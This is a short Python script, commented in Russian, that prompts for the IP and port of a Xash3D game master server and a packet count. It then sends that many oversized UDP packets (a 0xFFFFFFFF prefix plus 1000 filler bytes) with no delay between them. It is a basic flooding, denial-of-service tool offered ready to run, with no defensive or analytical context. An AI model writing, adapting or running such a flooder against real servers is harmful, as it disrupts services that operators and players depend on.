import socket
import time

# Функция для отправки запросов на мастер-сервер Xash3D
def send_request(server_ip, server_port, num_requests):
    message = b"\xff\xff\xff\xff" + b"A" * 1000  # Формирование запроса

    # Создание сокета
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(2)  # Устанавливаем таймаут для сокета
        try:
            for i in range(num_requests):
                print(f"Отправка запроса {i + 1} из {num_requests}...")
                sock.sendto(message, (server_ip, server_port))  # Отправка запроса на сервер
                time.sleep(0)  # Задержка между запросами (по необходимости можно изменить)
            print("Запросы отправлены успешно!")
        except Exception as e:
            print(f"Произошла ошибка при отправке запроса: {e}")

# Основная часть программы
def main():
    server_ip = input("Введите IP-адрес мастер-сервера: ")
    server_port = int(input("Введите порт мастер-сервера (например, 27011): "))
    
    # Ввод количества запросов
    try:
        num_requests = int(input("Введите количество запросов: "))
    except ValueError:
        print("Ошибка: введите корректное число.")
        return
    
    # Отправка запросов
    send_request(server_ip, server_port, num_requests)

if __name__ == "__main__":
    main()

